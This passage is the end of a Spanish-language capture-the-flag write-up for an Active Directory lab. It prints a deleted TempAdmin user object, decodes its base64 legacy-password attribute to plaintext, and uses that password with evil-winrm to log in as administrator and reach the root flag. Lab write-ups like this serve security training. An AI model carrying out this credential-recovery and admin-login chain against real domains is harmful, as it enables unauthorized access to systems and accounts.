cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
CN                              : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
codePage                        : 0
countryCode                     : 0
Created                         : 1/27/2020 3:23:08 AM
createTimeStamp                 : 1/27/2020 3:23:08 AM
Deleted                         : True
Description                     :
DisplayName                     : TempAdmin
DistinguishedName               : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
dSCorePropagationData           : {1/27/2020 3:23:08 AM, 1/1/1601 12:00:00 AM}
givenName                       : TempAdmin
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : OU=Users,OU=UK,DC=cascade,DC=local
lastLogoff                      : 0
lastLogon                       : 0
logonCount                      : 0
Modified                        : 1/27/2020 3:24:34 AM
modifyTimeStamp                 : 1/27/2020 3:24:34 AM
msDS-LastKnownRDN               : TempAdmin
Name                            : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : user
ObjectGUID                      : f0cc344d-31e0-4866-bceb-a842791ca059
objectSid                       : S-1-5-21-3332504370-1206983947-1165150453-1136
primaryGroupID                  : 513
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 132245689883479503
sAMAccountName                  : TempAdmin
sDRightsEffective               : 0
userAccountControl              : 66048
userPrincipalName               : TempAdmin@cascade.local
uSNChanged                      : 237705
uSNCreated                      : 237695
whenChanged                     : 1/27/2020 3:24:34 AM
whenCreated                     : 1/27/2020 3:23:08 AM
```

Se encuentra el parámetro: `cascadeLegacyPwd: YmFDVDNyMWFOMDBkbGVz`.

```PowerShell
echo "YmFDVDNyMWFOMDBkbGVz" | base64 -d
baCT3r1aN00dles
```

```PowerShell
evil-winrm -i 10.129.10.53 -u 'administrator' -p 'baCT3r1aN00dles'
```

La flag de `root` se encuentra en: `C:\Users\Administrator\Desktop`.

---